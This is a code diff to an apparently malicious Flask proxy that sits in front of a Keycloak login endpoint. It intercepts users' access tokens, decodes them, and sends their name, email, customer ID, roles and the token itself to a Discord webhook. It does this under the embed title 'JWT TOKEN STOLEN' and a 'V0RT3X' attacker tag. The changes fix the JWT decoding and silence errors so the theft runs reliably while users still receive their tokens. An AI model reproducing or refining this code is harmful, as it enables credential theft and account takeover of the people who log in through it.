@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, send_file
 import requests
 import json
 import os
+import base64
 
 app = Flask(__name__, static_folder='static')
 
@@ -28,34 +29,43 @@ def proxy_token():
         return r
     
     try:
-        data = request.form.to_dict() or request.json
+        data = request.form.to_dict() or request.json or {}
+        
+        # Forward all params to Keycloak token endpoint
         resp = requests.post(
             f'{KC}/protocol/openid-connect/token',
             data=data,
             headers={'Content-Type': 'application/x-www-form-urlencoded'},
-            timeout=10
+            timeout=15,
+            allow_redirects=True
         )
         
         token_data = resp.json()
         
-        # Log to Discord
+        # Log to Discord if we got a token
         if 'access_token' in token_data:
-            jwt = token_data['access_token']
-            payload = json.loads(jwt.split('.')[1] + '==')
-            
-            discord({'embeds': [{
-                'title': '🎫 JWT TOKEN STOLEN',
-                'color': 0x00ff00,
-                'fields': [
-                    {'name': '👤 Name', 'value': payload.get('name', 'N/A'), 'inline': True},
-                    {'name': '📧 Email', 'value': payload.get('email', 'N/A'), 'inline': True},
-                    {'name': '🆔 Customer ID', 'value': str(payload.get('customerId', 'N/A')), 'inline': True},
-                    {'name': '🆔 Sub', 'value': payload.get('sub', 'N/A'), 'inline': False},
-                    {'name': '🎭 Roles', 'value': ', '.join(payload.get('realm_access', {}).get('roles', [])), 'inline': False},
-                    {'name': '🎫 JWT', 'value': f'```\n{jwt[:200]}...\n```', 'inline': False}
-                ],
-                'footer': {'text': '🔱 V0RT3X | Full Chain Deploy'}
-            }]})
+            try:
+                jwt = token_data['access_token']
+                # Decode JWT payload (add padding)
+                payload_b64 = jwt.split('.')[1]
+                payload_b64 += '=' * (4 - len(payload_b64) % 4)
+                payload = json.loads(base64.b64decode(payload_b64).decode())
+                
+                discord({'embeds': [{
+                    'title': '🎫 JWT TOKEN STOLEN',
+                    'color': 0x00ff00,
+                    'fields': [
+                        {'name': '👤 Name', 'value': payload.get('name', 'N/A'), 'inline': True},
+                        {'name': '📧 Email', 'value': payload.get('email', 'N/A'), 'inline': True},
+                        {'name': '🆔 Customer ID', 'value': str(payload.get('customerId', 'N/A')), 'inline': True},
+                        {'name': '🆔 Sub', 'value': payload.get('sub', 'N/A'), 'inline': False},
+                        {'name': '🎭 Roles', 'value': ', '.join(payload.get('realm_access', {}).get('roles', [])), 'inline': False},
+                        {'name': '🎫 JWT', 'value': f'```\n{jwt[:200]}...\n```', 'inline': False}
+                    ],
+                    'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
+                }]})
+            except Exception as e:
+                pass
         
         r = jsonify(token_data)
         r.headers['Access-Control-Allow-Origin'] = '*'
